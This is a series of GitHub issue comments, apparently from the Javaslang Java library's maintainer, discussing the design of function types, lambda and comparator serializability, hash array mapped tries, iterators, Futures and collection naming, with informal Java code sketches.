}\n\n    default List<Class<?>> parameterList() {\n        return List.of(parameterArray());\n    }\n\n    default Class<?> parameterType(int index) {\n        return parameterArray()[index];\n    }\n}\n\n}\ninterface Function1 extends \u03bb.Type {\n@Override\ndefault Type<T1, R> getType() {\n    return \u03bb.super.getType()::asMethodType;\n}\n\ninterface Type<T1, R> extends \u03bb.Type<R> {\n\n    @SuppressWarnings(\"unchecked\")\n    default Class<T1> parameterType1() {\n        return (Class<T1>) parameterType(0);\n    }\n}\n\n}\n```\nwe deduced the method Function1.getType() as follows:\njava\n@Override\ndefault Type<T1, R> getType() {\n    final \u03bb.Type<R> superType = \u03bb.super.getType();\n    return new Type<T1, R>() {\n        @Override\n        public MethodType asMethodType() {\n            return superType.asMethodType();\n        }\n    };\n}\nis the same as:\njava\n@Override\ndefault Type<T1, R> getType() {\n    final \u03bb.Type<R> superType = \u03bb.super.getType();\n    return () -> superType.asMethodType();\n}\nis the same as:\njava\n@Override\ndefault Type<T1, R> getType() {\n    return \u03bb.super.getType()::asMethodType;\n}\nPlease note: there are no @FunctionalInterface annotations.\n. \"Keep it simple\"\nI reduced \u03bb.Type to:\njava\ninterface \u03bb<R> {\n    interface Type<R> {\n        Class<R> returnType();\n        Class<?>[] parameterArray();\n    }\n}\nWe will add additional method when needed.\nThe concrete Functions have properly parameter type getters:\njava\ninterface Function1<T1, R> extends \u03bb<R> {\n    interface Type<T1, R> extends \u03bb.Type<R> {\n        @SuppressWarnings(\"unchecked\")\n        default Class<T1> parameterType1() {\n            return (Class<T1>) parameterArray()[0];\n        }\n    }\n}\nUpdate: Also Types are Serializable. I marked the interfaces as Serializable. Is this part of the contract of an interface? Probably yes. But then we have a new story - all the other Javaslang interfaces have to be marked as Serializable o_O. In fact they were already and I moved the marker to the classes. But maybe the interfaces should be marked again, as serialization is part of the contract. In this special case here, we don't see classes. They are anonymous classes.\nUpdate: I think Functions are special regarding Serialization. These interfaces, and their Types, are marked as Serializable. All other interfaces (e.g. collection) align with the Java API and do not implement Serializable. E.g. java.util.List is not Serializable but java.util.ArrayList is. Again: Function Types are interfaces, their implementations are (currently) anonymous classes. Therefore it is ok when the Type interfaces extend Serializable.\n. Great work!\n. Many thanks, great addition! It is good to have a fresh mind looking over the / and adding new functionality.\n. Me too!\n. @ruslansennov I've made some slight modifications - I hope this does not cause merge-conflicts at your fork. I'm now jumping on the 'collection' train. First I setup the FilterMonadic stuff, then Set interface, then SortedSet based on Red-Back-Tree...\nHashSet should be relatively easy because it is backed on a HashMap, right?\n. @ruslansennov Technically yes, and Tree is a List of Lists :)\n. Great, that makes sense!\n. You can't imagine how happy I am that we have a HashMap :-))\n\n. I know what you meant :-)\nand didn't recognize it\n. No rush, I'm thankful for your hand! I will also add some functionality the next days - step by step.\n. Also remove all occurrences of flatten(Function) and flattenM(Function). These are equivalent to flatMap and flatMapM.\n. This will not work without having plenty of RuntimeExceptions when values are undefined regarding get(). Therefore I will close this issue.\n. Currently out of scope for the next release. I will send this to the backlog. Also I'm not sure, if this will be really relevant in practice.\n. For now we will not make Queue an interface. Instead Queue, HashSet and HashMap will stay classes. Vector will be made a class, too, to be consistent regarding the mentioned types.\n. Nice refactoring!\n. You are fast, I even haven't brewed my first coffee :)\n. Wow, thanks! That was fast :)\n. thx!\n. We need to take care / test different scenarios regarding serializability of SortableSets/SortableMaps.\nEspecially the complete chain of objects has to be serializable, e.g. TreeMap has a RedBlackTree has a Comparator.\nThe Comparator may be\n- a method reference, e.g. K::compareTo for a generic type K extends Comparator<? super K>\n- or a lambda expression, e.g. (k1, k2) -> k1.compareTo(k2)\nWe cast lambda expressions to (Comparator<? super K> & Serializable). Is this also possible with method references? If not, the complete chain (see above) is not serializable. Solution: do not use method references, use lambda expressions instead.\nExample of method reference usage:\njava\npublic static <K extends Comparable<? super K>, V> TreeMap<K, V> empty() {\n    return new TreeMap<>(RedBlackTree.empty(entryComparator(K::compareTo)));\n}\n. ``` java\npublic interface RedBlackTree extends java.lang.Iterable {\n// variant 1\nstatic <T extends Comparable<? super T>> Empty<T> empty() {\n    final Comparator<? super T> comparator = (Comparator<? super T> & Serializable) (t1, t2) -> t1.compareTo(t2);\n    return new Empty<>(comparator);\n}\n\n// variant 2 - I think this will result in a ClassCastException\nstatic <T extends Comparable<? super T>> Empty<T> empty() {\n    final Comparator<? super T> comparator = (Comparator<? super T> & Serializable) T::compareTo;\n    return new Empty<>(comparator);\n}\n\n}\n```\n. Get TreeSet.length() and TreeMap.length() right. Do Map and Set interfaces need size() method?\n. As mentioned above, the following Comparator method reference is not serializable:\n``` java\nimport java.io.Serializable;\nimport java.util.Comparator;\nimport static javaslang.Serializables.deserialize;\nimport static javaslang.Serializables.serialize;\npublic class Test {\npublic static void main(String[] args) {\n\n    SerializableComparator<Integer> serialComp = SerializableComparator.create();\n\n    System.out.println(serialComp.compare(1, 2));\n\n    // RUNTIME EXCEPTION: \"Error serializing object\"\n    SerializableComparator<Integer> evilBrother = deserialize(serialize(serialComp));\n\n    System.out.println(evilBrother.compare(1, 2));\n}\n\n}\nclass SerializableComparator implements Serializable {\nprivate final Comparator<? super T> comparator;\n\nprivate SerializableComparator(Comparator<? super T> comparator) {\n    this.comparator = comparator;\n}\n\nstatic <T extends Comparable<? super T>> SerializableComparator<T> create() {\n    return new SerializableComparator<>(T::compareTo);\n}\n\nint compare(T t1, T t2) {\n    return comparator.compare(t1, t2);\n}\n\n}\n```\n. The following change does fix the code above:\njava\nstatic <T extends Comparable<? super T>> SerializableComparator<T> create() {\n    return new SerializableComparator<>((Comparator<? super T> & Serializable) T::compareTo);\n}\n. Accordingly this example does not work (for arbitrary functions):\n``` java\nimport java.io.Serializable;\nimport java.util.function.Function;\nimport static javaslang.Serializables.deserialize;\nimport static javaslang.Serializables.serialize;\npublic class Test {\npublic static void main(String[] args) {\n\n    SerializableFunction<Integer, Integer> serialFun = SerializableFunction.create(i -> i + 1);\n\n    System.out.println(serialFun.apply(1));\n\n    // RUNTIME EXCEPTION: \"Error serializing object\"\n    SerializableFunction<Integer, Integer> evilBrother = deserialize(serialize(serialFun));\n\n    System.out.println(serialFun.apply(1));\n}\n\n}\nclass SerializableFunction implements Serializable {\nprivate final Function<? super T, ? extends R> f;\n\nprivate SerializableFunction(Function<? super T, ? extends R> f) {\n    this.f = f;\n}\n\nstatic <T, R> SerializableFunction<T, R> create(Function<? super T, ? extends R> f) {\n    return new SerializableFunction<>(f);\n}\n\nR apply(T t) {\n    return f.apply(t);\n}\n\n}\n```\n. But when we apply the same 'trick' in this example...\njava\nstatic <T, R> SerializableFunction<T, R> create(Function<? super T, ? extends R> f) {\n    return new SerializableFunction<>((Function<? super T, ? extends R> & Serializable) f);\n}\n...we get the following error:\nException in thread \"main\" java.lang.ClassCastException:\njavaslang.collection.Test$$Lambda$1/664223387 cannot be cast to java.io.Serializable\n. Being creative does not help here:\njava\nstatic <T, R> SerializableFunction<T, R> create(Function<? super T, ? extends R> f) {\n    // AGAIN: \"Error serializing object\"\n    return new SerializableFunction<>((Function<? super T, ? extends R> & Serializable) f::apply);\n}\nThis is because the method reference is now serializable but the underlying function f is still not serializable.\n. I know currently only one working solution, namely using a serializable functional interface, like javaslang.Function1:\njava\nstatic <T, R> SerializableFunction<T, R> create(Function1<? super T, ? extends R> f) {\n    return new SerializableFunction<>(f);\n}\nBeing aware of this, we need to introduce a functional interface SerializableComparator.\nReason: Our first fix...\njava\nstatic <T extends Comparable<? super T>> SerializableComparator<T> create() {\n    return new SerializableComparator<>((Comparator<? super T> & Serializable) T::compareTo);\n}\n...can be exploited like this:\n``` java\npublic class Test {\npublic static void main(String[] args) {\n\n    SerializableComparator<Integer> serialComp = SerializableComparator.create((i1, i2) -> i2 - i1);\n\n    System.out.println(serialComp.compare(1, 2));\n\n    // ERROR: javaslang.collection.Test$$Lambda$1/824909230 cannot be cast to java.io.Serializable\n    SerializableComparator<Integer> evilBrother = deserialize(serialize(serialComp));\n\n    System.out.println(evilBrother.compare(1, 2));\n}\n\n}\nclass SerializableComparator implements Serializable {\nprivate final Comparator<? super T> comparator;\n\nprivate SerializableComparator(Comparator<? super T> comparator) {\n    this.comparator = comparator;\n}\n\nstatic <T> SerializableComparator<T> create(Comparator<? super T> comparator) {\n    return new SerializableComparator<>((Comparator<? super T> & Serializable) comparator);\n}\n\nint compare(T t1, T t2) {\n    return comparator.compare(t1, t2);\n}\n\n}\n```\nThis is the fix:\n``` java\npublic class Test {\npublic static void main(String[] args) {\n\n    SerializableComparatorWrapper<Integer> serialComp = SerializableComparatorWrapper.create((i1, i2) -> i2 - i1);\n\n    System.out.println(serialComp.compare(1, 2));\n\n    // ERROR: javaslang.collection.Test$$Lambda$1/824909230 cannot be cast to java.io.Serializable\n    SerializableComparatorWrapper<Integer> evilBrother = deserialize(serialize(serialComp));\n\n    System.out.println(evilBrother.compare(1, 2));\n}\n\n}\nclass SerializableComparatorWrapper implements Serializable {\nprivate final Comparator<? super T> comparator;\n\nprivate SerializableComparatorWrapper(Comparator<? super T> comparator) {\n    this.comparator = comparator;\n}\n\nstatic <T> SerializableComparatorWrapper<T> create(SerializableComparator<? super T> comparator) {\n    return new SerializableComparatorWrapper<>(comparator);\n}\n\nint compare(T t1, T t2) {\n    return comparator.compare(t1, t2);\n}\n\n}\n@FunctionalInterface\ninterface SerializableComparator extends Comparator, Serializable {\n}\n``\n. Summary:\n-T::compareTomay be casted like this:(Comparator<? super T> & Serializable)`\n- functional interface args have to be serializable\n. I changed the API of RedBlackTree, TreeSet and TreeMap (, Tuple*.comparator()) to use SerializableComparator instead of Comparator. This does not seem to be the right way. We go the Java way and use java.util.Comparator. This does not feel so alien. Drawback: the user has to take care of serializability.\n. In Map these return types are abnormal but inevitable:\n``` java\n@Override\n Set flatMap(Function<? super Entry, ? extends java.lang.Iterable<? extends U>> mapper);\n@Override\n Seq map(Function<? super Entry, ? extends U> mapper);\n``\n. MaybeflatMap(Function)should returnSeqinsteadSet!?\n. Clarification onmapandflatMap`:\nMap inherits the following functions from Traversable:\n``` java\n// Other collections return the current type (here for example: Map)\n// We return Seq instead of Map because we are not able to express K and V with U\n Seq flatMap(Function<? super Entry, ? extends java.lang.Iterable<? extends U>> mapper);\nSeq flatten();\n Seq map(Function<? super Entry, ? extends U> mapper);\n```\nAs we see, Java's type system can't express that the generic return type U needs to be unfolded to a key/value type (K, V). We address this by adding additional methods to Map:\n``` java\n Map flatMap(BiFunction<? super K, ? super V, ? extends java.lang.Iterable<? extends Entry<? extends U, ? extends W>>> mapper);\n Map map(BiFunction<? super K, ? super V, ? extends Entry<? extends U, ? extends W>> mapper);\n```\nPlease note that a SortedMap also maintains a Comparator<? super K> for the keys. The mapping functions of map and flatMap transform the key type. By default, the new key type of a SortedMap is supposed to be comparable. Because the signatures of map and flatMap do not reflect that the key type is comparable, the natural comparator is used. This goes along with the behavior of Java's SortedMap (and SortedSet) of the standard library.\nNote: We should but can't change the signature of map and flatMap to the following in order to reflect that the new key type is comparable, because this would break the inheritance/would be ambiguous:\n``` java\n Map, W> flatMap(BiFunction<? super K, ? super V, ? extends java.lang.Iterable<? extends Entry<? extends U, ? extends W>>> mapper);\n Map, W> map(BiFunction<? super K, ? super V, ? extends Entry<? extends U, ? extends W>> mapper);\n```\nWe will add additional methods to SortedMap (and SortedSet) for transformations like map and flatMap, which will take an additional comparator parameter. These can be used if a comparator different to the natural comparator is needed.\nI.e. for map and flatMap, SortedMap will have also\n``` java\n Map flatMap(Comparator<? super U> keyComparator, BiFunction<? super K, ? super V, ? extends java.lang.Iterable<? extends Entry<? extends U, ? extends W>>> mapper);\n Map map(Comparator<? super U> keyComparator, BiFunction<? super K, ? super V, ? extends Entry<? extends U, ? extends W>> mapper);\n```\nNote: The (key)comparator is per definition always the first argument because it is the only way for varargs methods like HashMap.of(Comparator, Object...). All other method signatures having a comparator should be consistent to this.\n. My current understanding is, that the semantics of Map.flatten() and SortedMap.flatten() should be either undefined, i.e. the methods should throw an UnsupportedOperationException - or only the value should be flattened:\njava\nMap(1 -> Map(2 -> \"a\", 3 -> \"b\"), 4 -> \"c\").flatten() = Map(2 -> \"a\", 3 -> \"b\", 4 -> \"c\")\n. Also\njava\n  Map(1 -> List(Map(2 -> \"a\"), Some(Map(3 -> \"b\")), \"wat!?\"), 4 -> \"c\").flatten()\n= Map(2 -> \"a\", 3 -> \"b\", 4 -> \"c\")\n. HashSet is there, solved step-by-step along with HashMap.\n. This is most probably the reason why Scala has an Iterator with map/flatMap capabilities - I stumbled today over this topic (Views vs. Iterators vs. Streams).\nI will implement a Scala-like javaslang.collection.Iterator for such purpose. But until we have it, we will do it like this.\n. Nope. Directly returning 1 for empty collections is a bad idea. Safety first. Empty collections should return the following. Then we are able to swap the hash-routine internally.\njava\n@Override\npublic int hashCode() {\n    return Traversable.hash(this);\n}\n. Double checked all collections - this is done.\n. Yes, that's 'not so nice'. I temporary remove the test.\n. Build fixed. Follow-up: #438 \n. This means that TraversableOnce is not soley responsible for forEach, exists, filter(?)`, ...\nThese methods should be also be declared by Value and FilterMonadic.\n. Obsolete with #473 \n. We need a Lazy.of(SerializableSupplier) instead of Lazy.of(Supplier).\nRule of thumb: Functional interfaces (like SerializableSupplier) should be defined at type level (as inner interface), if they are\n1. part of the API of the type, like Lazy.of(SerializableSupplier)\n2. used only by one type\n. NO, the above is not correct. We need to stay with Lazy.of(Supplier), mark the supplier field transient and implement a custom serialization logic (SerializationProxy), that evaluates the Lazy before Serialization and serializes/deserializes the value only!\n. Hi Dillon,\nok. I'm on vacation this week - could you uncomment the tests, please, and fix it?\nAfter finishing the collections I will spend more time on the futures. E.g. the FilterMonadic interface may be implemented.\nGreets,\nDaniel\n. Fixed with #633 by Dillon\n. @ruslansennov I'm on vacation with my family for one week, starting tomorrow. Notebook has to stay home o_O... I will try to go online at most once a day. We will see.\n. @ruslansennov I refactored the collections a little bit. Please have a look (HashSet, HashMap). There is now javaslang.collection.Iterator...\n. Yes...\n. I made HAMT and Interface. That leaks the inner classes to the public.\nPro: this enables pattern matching by subtype, 'introspection' and Proxying of the HAMT.\nCon: the public API shows more classes\nI'm not sure. We can switch back, when in doubt. The RedBlackTree is also designed as Interface with inner static classes. I like interfaces in general. They are more flexible, and it seems a good design practice to me.\n. Ok. Abstract classes were always some intermediate types to me, not intended to be directly used other than extending them for own types. We will go with interfaces for now. I hope that Java 9 gives us some extra syntax regarding interfaces to hide private methods and maybe private inner classes. We will see.\n. I think we have to restrict ourselves on one component (key or values) and add an additional map method:\n``` java\npublic interface Map extends FilterMonadic, V> {\n// maps values\n@Override\n<U> Map<K, U> map(Function<? super V, ? extends U> mapper);\n\n// maps entries\n<U, W> Map<U, W> map(BiFunction<? super K, ? super V, ? extends Entry<? extends U, ? extends W>> mapper);\n\n}\n```\nOr do not implement FilterMonadic at all and just add map(BiFunction)\n. Analog:\njava\n<U, W> Map<U, W> map(BiFunction<? super K, ? super V, ? extends Map<? extends U, ? extends W>> mapper);\n. Not relevant any more.\nFilterMonadic is gone, now we have Value.\nflatMap and map are already revised in #490.\n. Thx! Iterator is hacked from the brain to the keyboard. All untested code...\n. With #473 cartesianProduct was renamed to crossProduct.\nTODO: Need to rename join() now to mkString().\n. Fixed with #482 \n. Thank you!\n. According to Sebastian, it should word. We will wait for feedback from the community, if Xtend is used in conjunction with Javaslang.\n. Already fixed...\n. no - not fixed...\n. We can't rely on front and rear because these are equal queues (same type, same elements in the right order): ((1, 2, 3),(6, 5, 4)) equals ((1, 2, 3, 4)(6, 5)). Therefore we do not remove the transient field hashCode.\n. Future:\n- orient on Scala's Future trait API (zip, ...). We use forEach intead of foreach.\n- ~~add Awaitable super interface~~\n- There should be only one constructor. Maybe we can remove the dependency to Java's CompletableFuture completely and provide a static factory method which wraps one in a Future.\n- multiple callbacks vs. mutable state\n- remove complete() method. This is a member of Promise only\n- it should implement FilterMonadic and additionally implement mapTry, flatMapTry, like Try does. Bug: mapTry and flatMapTry need to take a Try.CheckedFunction\n- the recover* et al. methods should be aligned to Try.*. Maybe add an interface Recoverable extended by Future and Try?\n- substitute the onCompleted() methods with onComplete(Consumer<? super Try<? super T>>). Maybe provide also onComplete(Consumer<? super Success<? super T>, Consumer<? super Failure<? super T>>). There is no need for a completeTry(CheckedConsumer..), we use args () -> Try.run(...) instead.\n- transform should also take a Try<T>> (and move to Filtermonadic, TraversableOnce and Value in the form of <U> Kind<M, U> transform(Function<? super Kind<? super M, ? super T>>, Function<? extends Kind<? extends M, ? extends U>>)\n. We should also take a Scala-like Awaitable interface into account.\n. We should provide cancellation of futures (which is currently not part of Scala's Future but supported by Java's Future).\nSemantics:\n- cancellation is guarded by the same lock as value (= result), actions (= callbacks) and job (= computation) but has no separate instance variable\n- if Future is constructed but does not run() (e.g. when used within Promise) then cancellation does nothing\n- if Future.isComplete() then cancellation does nothing\n- if Future is running and not complete then cancellation changes the state as follow: value = Some(Failure(NoSuchElementException(\"cancelled\")), actions are performed and set to null, job is set to null\n- let cancel() return boolean indicating if cancellation succeeded with respect to the points mentioned above.\n- cancel() should interrupt all ongoing threads (by default)\n- TODO: does cancel() need to be performed without interruption?\n- TODO: what if an error occurs during cancellation? (let it fail!)\n- TODO: how jobs need to handle interrupted exceptions? what implication has this for Try.of(computation) using in run() method?\nSee also this discussion and Learning Concurrent Programming in Scala, Ch. 4.\n. Future implements Value which has boolean isEmpty() and T get().\nBasicially these are the ways to implement the methods (assuming result to be of type Try):\nisEmpty():\n1. throw, if the Future isn't yet completed, otherwise return result.isEmpty()\n2. return true, if the Future isn't yet completed, otherwise return result.isEmpty()\n3. block until the Future is completed, then return result.isEmpty()\nget():\n1. throw, if the Future isn't yet completed, otherwise throw if result.isEmpty(), return result.get() if result.isDefined()\n2. block until the Future is completed, then throw if result.isEmpty(), return result.get() if result.isDefined()\nWe expect a function call to be referential transparent, especially that subsequent calls return the same result. This implies that we only have one option: to block until the future completed.\n. Fixed.\n- Dillon's static sequence(Tuple*) methods are removed. They are blowing up too much the Future API. Instead we use Future.sequence(tuple.toSeq()), if needed.\n- We omitted the *Try method like mapTry(CheckedFunction). Maybe these methods will appear in Javaslang 2.0.1.\nDeferred to Javaslang 2.0.1:\n- transform methods\n- await(duration, unit) and get(duration, unit)\n. Duplicate of #465 (which has a better description)\n. Closed with #461 \n. No, these methods are a bridge between Java Iterator and Javaslang Iterator.\n. ok, splitAt should not throw\n. Thanks @ruslansennov, awesome!\n. What if we put the entries in a (Sorted)Set instead? E.g. containing Tuple2 with compared by ._1/key?\n. Using List, we have O(n), using Set it is O(log_2(n)) for operations on entries.\nI have to take a look on other HAMT impls and need also to understand, why a HAMT backed by a Set (RedBlackTree) performs better than using just a RedBlackTree (containing Entries compared by key). How do Scala and Closure store the entries in a HAMT?\nInteresting!\n. Good readings:\n- A mutable variant: http://lampwww.epfl.ch/~prokopec/ctries-snapshot.pdf (Scala impl: TrieMap)\n- http://lampwww.epfl.ch/papers/idealhashtrees.pdf\n. Our API will declare return type Set, that makes it flexible for other impls.\nOur implementation may use SortedSet for performance reasons, if it makes sense.\n. (minor thing) We could make the number of slots (currently 32) a constant SLOTS, just for clarity.\nhttps://github.com/javaslang/javaslang/blob/master/src/main/java/javaslang/collection/HashArrayMappedTrie.java#L345\n. @ruslansennov Is there still something to do here? https://github.com/javaslang/javaslang/blob/master/src/main/java/javaslang/collection/HashArrayMappedTrie.java#L208-L216\n. thanks for investigating! then let's stay with our List.\n. Finished with #457 \n. Super-cool, thx!\n. Top! This brought the collections forward - not only HAMT.\n. Finished with #455 and #457 \n. Boom - fixed by @ruslansennov. Many thanks!\n. Fixed with #472 \n. Hi Ruslan,\nI fiddled around some time and think we have to go lazy here. This will return an Iterator for a Map in O(1), regardless of the size. My intention is that we modify ConcatIterator like this:\n``` java\nclass ConcatIterator implements Iterator {\nprivate final Iterator<? extends Iterator<? extends T>> iterators;\nprivate Iterator<? extends T> current = Iterator.empty(); // important for lazy processing\n\nprivate ConcatIterator(Iterator<? extends Iterator<? extends T>> iterators) {\n    this.iterators = iterators;\n}\n\n// hasNext and next as you implemented them\n\nprivate static boolean isEmpty(Iterable<?> iterable) {\n   return (iterable instanceof TraversableOnce && ((TraversableOnce<?>) iterable).isEmpty()) \n            || (iterable instanceof java.util.Collection && ((java.util.Collection<?>) iterable).isEmpty());\n}\n\n}\n```\nWe use Iterator.next() and hasNext() instead of Traversable.head() and tail() here.\nOur Iterator then has these static factory methods\n``` java\n    static  Iterator ofIterables(Iterable<? extends Iterable<? extends T>> iterables) {\n        Objects.requireNonNull(iterables, \"iterables is null\");\n        if (ConcatIterator.isEmpty(iterables) {\n            return Iterator.empty();\n        }\n        final Iterator<? extends Iterator<? extends T>> iterators = Stream.ofAll(iterables).map(Iterable::iterator).iterator();\n        return iterators.hasNext() ? new ConcatIterator<>(iterators) : Iterator.empty();\n    }\n@SuppressWarnings({\"unchecked\", \"varargs\"})\n@SafeVarargs\nstatic <T> Iterator<T> ofIterables(Iterable<? extends T>... iterables) {\n    Objects.requireNonNull(iterables, \"iterables is null\");\n    if (iterables.length == 0)) {\n        return Iterator.empty();\n    }\n    final Iterator<? extends Iterator<? extends T>> iterators =  Stream.of(iterables).map(Iterable::iterator).iterator();\n    return iterators.hasNext() ?  new ConcatIterator<>(iterators) : Iterator.empty();\n}\n\nstatic <T> Iterator<T> ofIterators(Iterable<? extends Iterator<? extends T>> iterators) {\n    Objects.requireNonNull(iterators, \"iterators is null\");\n    if (ConcatIterator.isEmpty(iterators) {\n        return Iterator.empty();\n    }\n    // TODO: empty iterator check\n    return new ConcatIterator<>(Stream.ofAll(iterators).iterator()); // ensures laziness\n}\n\n@SuppressWarnings({\"unchecked\", \"varargs\"})\n@SafeVarargs\nstatic <T> Iterator<T> ofIterators(Iterator<? extends T>... \n    Objects.requireNonNull(iterators, \"iterators is null\");\n    if (iterators.length == 0)) {\n        return Iterator.empty();\n    }\n    // TODO: empty iterator check\n    return new ConcatIterator<>(Stream.of(iterators).iterator());\n}\n\n```\nAnd finally the iterator() method of our two HAMT nodes returns:\njava\nreturn Iterator.ofIterables(subNodes);`\nWhat do you think?\n. Update: I Fixed many bugs in my previous comment.\n. great, I'm looking forward to it\n. Added GC frindly checks to factory methods. ~~Repetition is ok here.~~ Update: refactored redundant code.\n. Yes! Awesome.\n. One step further towards 2.0.0. Great!\n. Thanks, that helps. I'm not used to it, at $work we still use a self-hosted svn...\n. yep!\n. We will do the following:\nmaster\n                           |\n                           |     v2.0.x\nrelease v2.0.0 - - - - - - + - - - + 2.0.1-SNAPSHOT\n                           |       |\n                  bugfix1  |       |\n                     |     |       |\n                  PR X---->|<------+ cherry-picking bugfix1\n                           |       |\n                  featureA |       |\n                     |     |       |\n                  PR X---->|       |\n                           |       |\nrelease v2.0.1 - - - - - - | - - - + 2.0.2-SNAPSHOT\n                           |       |\n                           |       |     v2.1.x\nrelease v2.1.0 - - - - - - + - - - X - - - + 2.1.1-SNAPSHOT\n                           |               |\n                           |               |\n                  featureB |               |\n                     |     |               |\n                  PR x---->|               |\n                          ...             ...\n. I've documented this in CONTRIBUTION.md. I will close this ticket for now.\n. An internal HAMT<Integer, T> makes sense for Vector<T>.\nPlease tell me a little bit more about the details why we can remove ArrayNode and what changes regarding our performance characteristics (time/memory) if we do so.\n. Why is the cost of set O(n)? I know Tries in general but haven't read the paper about HAMT in depth. The Integer-keys should be distributed equally. I would expect O(1) then. Or has the complete Trie to be rewritten on set()? If so, why is the performance then better for other key-types. If the performance is not better for other key-types, why the ArrayNode is then used at all?\n. Nevertheless, do it with the best performance possible. You know the characteristics best. Although I want to understand it in depth.\n. From what I understand is, that we generally traded in our HAMT List against Array. In other words, this affects also our Map impls.\nThen I would keep our ArrayNode and substitute List with Array when we implemented it (see #295). This should boost it from O(n) to O(1), right?\n. Fine, let's do it this way.\n. Fixed with #480 \n. Hi @patrox, yes - exactly. It will be an IndexedSeq of Character that wraps a java.lang.String\n. Then we should name it WrappedString\n. @patrox :+1: you're welcome!\n. @patrox to start getting your hands dirty you could implement 1-2 euler tests. I like the Scala project of @shadaj as reference: https://github.com/shadaj/euler. The existing tests are located in src/test/java/javaslang/collection/euler\n. Great! There will be more todo - much more :-)\n. Alright!\n. @ruslansennov @patrox Guys, I urgently need some high quality sleep - I will come back tomorrow...\n. @ruslansennov @patrox \nBtw - Vector as return type in many places is the best choice because both, WrappedString and Vector, are of type IndexedSeq and therefore have similar performance characteristics (get, set, append, ...).\nHowever, I'm not completely convinced about the name WrappedString. In Scala it is 'hidden', i.e. not instantiable. But I have no better name, yet.\n- I don't like String2 very much.\n- Also Str and Chars are not so good.\n- Maybe IndexedString - but that is redundant. Or shorter IString (sounds like a new Apple product o_O)\n- RichString is taken by formatted strings\n- Wikipedia: 'a string is traditionally a sequence of characters'. Maybe then CharSeq. Also CharArray or Word are possible.\n. class CharSeq implements IndexedSequence<Character> makes sense, doesn't it?\n. mmhh, yes, it would be good to see it is a String by just looking at the API...\n. StringOnSteroids :-)\n. Stringoid - like Monoid - sounds algebraic... ok, time to relax and make some coffee... :-)\n. I will rename it to CharSeq < IndexedSeq < Seq for now. It is lightweight and easy to remember. WrappedString sounds too bulky.\n. yep, already done - thx! they reside in javaslang.collection\n. thanks for your help! good night!\n. Nice addition. The additional bytes for an instance are ok. Object serialization/deserialization still works. Great!\n. Looks great!\n(I'm offline for the rest of the day because we drive back home)\n. Fixed with #473 \n. Fixed with #473 \n. More specifically: Scala needs FilterMonadic for the for-comprehensions. We don't need that, yet.\nTraversableOnce is a Traversable with the property, that is traversable only once. We do not have that case in Javaslang, yet.\n. A Future works with callbacks. Like a Try, it may result in a value or an error. But as long, as the value isn't there, the methods isEmpty(), get(), orElse et al. are unsupported.\n@jbgi: How does scalaz solve this regarding a Monoid for a specific Future?\n. ## Monad\n\nMonads are parametric types with two operations flatMap and unit that obey some algebraic laws #MonadsDefinition 1\nMonads are structures that represent computations defined as sequences of steps #MonadsDefinition 2\nMonads are chainable containers types that confine values defining how to transform and combine them #MonadsDefinition 3\nMonad are structures that put a value in a computational context #MonadsDefinition 4\nMonads are return types that guide you through the happy path #MonadsDefinition 5\n\n- tweets by Mario Fusco\n. Fixed with #473 \n. ## API for single- and multi-valued types\nIn particular we want to create interfaces covering the following:\nValue-specific operations\n\nT get() (for collections: first element, if exisits. I.e. List(1) can be seen as value 1)\nT ifDefined(T trueCase, T falseCase)\nT ifDefined(Supplier<? extends T> trueCase, Supplier<? extends T> falseCase)\nT ifEmpty(T trueCase, T falseCase)\nT ifEmpty(Supplier<? extends T> trueCase, Supplier<? extends T> falseCase)\nboolean isEmpty()\nboolean isDefined()\nT orElse(T other)\nT orElseGet(Supplier<? extends T> supplier)\n<X extends Throwable> T orElseThrow(Supplier<X> supplier) throws X\n\nFilterMonadic operations\n\nFilterMonadic<M, T> filter(Predicate<? super T> predicate)\nFilterMonadic<M, ? extends Option<T>> filterOption(Predicate<? super T> predicate)\n<U> FilterMonadic<M, U> flatMapM(Function<? super T, ? extends Kind<? extends M, ? extends U>> mapper)\nFilterMonadic<M, Object> flatten()\n<U> FilterMonadic<M, U> map(Function<? super T, ? extends U> mapper)\n<U> FilterMonadic<U> unit(U u) (Traversable additionally has unit(Iterable))\n\nTraversable operations (on single- and multi-valued types)\n\nboolean exists(Predicate<? super T> predicate)\nboolean existsUnique(Predicate<? super T> predicate)\nboolean forAll(Predicate<? super T> predicate)\nvoid forEach(Consumer<? super T> action)\nTraversableOnce<T> peek(Consumer<? super T> action)\nIterator<T> iterator()\n\nConversions (single- and multi-valued)\n\nArray<T> toArray()\nList<T> toList()\n<K, V> Map<K, V> toMap(Function<? super T, ? extends Tuple2<? extends K, ? extends V>> f)\nQueue<T> toQueue()\nSet<T> toSet()\nStream<T> toStream()\nStack<T> toStack()\nTree<T> toTree()\nVector<T> toVector()\n\nJava interoperability:\n- T[] toJavaArray(Class<T> componentType)\n- java.util.List<T> toJavaList()\n- <K, V> java.util.Map<K, V> toJavaMap(Function<? super T, ? extends Tuple2<? extends K, ? extends V>> f)\n- java.util.Set<T> toJavaSet()\n- java.util.stream.Stream<T> toJavaStream()\nConversions (treated as single-valued)\nUpdate: Haskell converts a List to a Maybe by treating it as single-valued. See Maybe.listToMaybe\n- Lazy<T> toLazy()\n- Future<T> toFuture()\n- <R> Left<T, R> toLeft()\n- <L> Right<L, T> toRight()\n- Try<T> toTry()\n- Option<T> toOption()\nJava interoperability:\n- Optional<T> toJavaOptional()\n. Task: Create appropriate interfaces (maybe depending on each other) for the API described above.\n. Instead of filterOption for single valued types like Lazy, we will use filter and implement an empty Lazy, that will throw NoSuchElementException if get() is called. Given this, a Lazy is no more defined by definition, i.e. isEmpty() may return true.\n. Because FilterMonadic takes an additional generic type parameter for Kind, Value does not extend FilterMonadic. Instead we will add map(), filter() and flatten() to Value.\n. Fixed with #473 \n. Super-awesome! This improves not only memory-performance but also equals-performance.\n. I hope this will not cause too much trouble (merge-conflicts).\n. @ruslansennov My vacation is now over. That means I can only spend time on Javaslang now after may daylight job for the next weeks. :-/\n. Hi @sirinath,\nthanks for the question. Currently not in the sense of automated proof checking. Property checking here boils down to testing predicates on random generated test data. But theorems can be derived from polymorphic functions: http://ttic.uchicago.edu/~dreyer/course/papers/wadler.pdf\nDo you think, there is room for improvement?\n. Automated proof checking and property testing are two different things. The former is out of scope. The latter already tests if given predicates can be satisfied.\nI will close this ticket because I don't see how to further improve the property check framework. Next time, please give more details which features are needed in particular. Examples are welcome!\n. @ruslansennov You're right - I closed it accidentally\n. See #936 \n. Missing conversion tests:\n- Map/HashMap/LinkedHashMap/TreeMap#toJavaMap()\n- Set/HashSet/LinkedHashSet/TreeSet#toJavaSet()\nMissing narrow tests:\n- 